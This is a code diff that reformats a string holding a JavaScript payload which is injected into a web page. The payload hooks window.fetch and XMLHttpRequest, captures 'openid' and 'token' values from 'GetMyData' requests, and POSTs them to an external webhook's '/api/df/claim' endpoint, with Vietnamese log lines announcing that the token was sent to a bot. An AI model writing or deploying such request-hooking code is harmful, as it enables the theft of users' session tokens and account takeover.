@@ -70,22 +70,27 @@
     try {
       var s = document.createElement('script');
       s.id = 'df-webhook-script';
-      s.textContent = '(function(){var WEBHOOK_URL=\'' + WEBHOOK_URL + '\''
-        + ',CODE=\'' + CODE + '\''
-        + ',done=!1,openid=\'\',token=\'\','
-        + 'f=window.fetch;window.fetch=function(){var u=arguments[0];'
-        + 'if("string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;'
-        + 'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}'
-        + 'return f.apply(this,arguments)};'
-        + 'var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){this._df_u=u;return o.apply(this,arguments)};'
-        + 'var x=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var u=this._df_u;'
-        + 'if(u&&"string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;'
-        + 'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}'
-        + 'return x.apply(this,arguments)};'
-        + 'if(openid&&token){try{fetch(WEBHOOK_URL+"/api/df/claim",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code:CODE,openid:openid,token:token}),mode:"no-cors"});'
-        + 'console.log("%c[DF] ✅ Đã gửi token về bot! Chờ DM.","color:#0f0")}'
-        + 'catch(e){console.log("%c[DF] ⚠️ Gửi fail:","color:#f80",e)}}'
-        + '})();';
+      s.textContent =
+        "(function(){var WEBHOOK_URL='" +
+        WEBHOOK_URL +
+        "'" +
+        ",CODE='" +
+        CODE +
+        "'" +
+        ",done=!1,openid='',token=''," +
+        'f=window.fetch;window.fetch=function(){var u=arguments[0];' +
+        'if("string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;' +
+        'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}' +
+        'return f.apply(this,arguments)};' +
+        'var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){this._df_u=u;return o.apply(this,arguments)};' +
+        'var x=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var u=this._df_u;' +
+        'if(u&&"string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;' +
+        'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}' +
+        'return x.apply(this,arguments)};' +
+        'if(openid&&token){try{fetch(WEBHOOK_URL+"/api/df/claim",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code:CODE,openid:openid,token:token}),mode:"no-cors"});' +
+        'console.log("%c[DF] ✅ Đã gửi token về bot! Chờ DM.","color:#0f0")}' +
+        'catch(e){console.log("%c[DF] ⚠️ Gửi fail:","color:#f80",e)}}' +
+        '})();';
       document.head.appendChild(s);
       console.log('%c[DF] ✅ Script đã inject vào DOM. Nhấn F5 để reload trang.', 'color:#0f0');
     } catch (e: any) {
